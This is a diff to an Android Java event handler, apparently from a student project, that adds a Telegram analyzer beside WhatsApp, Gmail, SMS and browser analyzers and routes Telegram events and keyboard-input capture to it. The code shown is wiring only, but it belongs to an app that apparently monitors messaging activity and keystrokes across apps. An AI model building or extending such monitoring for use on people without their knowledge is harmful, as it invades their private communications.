@@ -8,6 +8,7 @@ import com.alberto.tfg.tormantos.analyzer.impl.browsing.FirefoxAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.communication.DialAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.communication.GmailAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.communication.SmsAnalyzerImpl;
+import com.alberto.tfg.tormantos.analyzer.impl.messaging.TelegramAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.messaging.WhatsappAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.system.GeneralAppAnalyzerImpl;
 import com.alberto.tfg.tormantos.analyzer.impl.system.NotificationAnalyzerImpl;
@@ -51,6 +52,7 @@ public class EventHandler {
      * Instant messaging analyzers
      */
     private WhatsappAnalyzerImpl whatsappAnalyzer;
+    private TelegramAnalyzerImpl telegramAnalyzer;
 
     /**
      * Web browsing analyzers
@@ -80,6 +82,7 @@ public class EventHandler {
 
         // -- instant messaging analyzers
         whatsappAnalyzer = new WhatsappAnalyzerImpl(context);
+        telegramAnalyzer = new TelegramAnalyzerImpl(context);
 
         // -- Browsing analyzers
         firefoxAnalyzer = new FirefoxAnalyzerImpl(context);
@@ -145,6 +148,9 @@ public class EventHandler {
             // Instant messaging cases
             case Strings.PACKAGE_WHATSAPP:
                 whatsappAnalyzer.compute(eventSto);
+                break;
+            case Strings.PACKAGE_TELEGRAM:
+                telegramAnalyzer.compute(eventSto);
                 break;
 
             // Web browsing cases
@@ -214,6 +220,8 @@ public class EventHandler {
             case Strings.PACKAGE_WHATSAPP:
                 whatsappAnalyzer.confirmKeyboardInput(eventSto.getCaptureInstant());
                 break;
+            case Strings.PACKAGE_TELEGRAM:
+                telegramAnalyzer.confirmKeyboardInput(eventSto.getCaptureInstant());
             default:
                 break;
         }
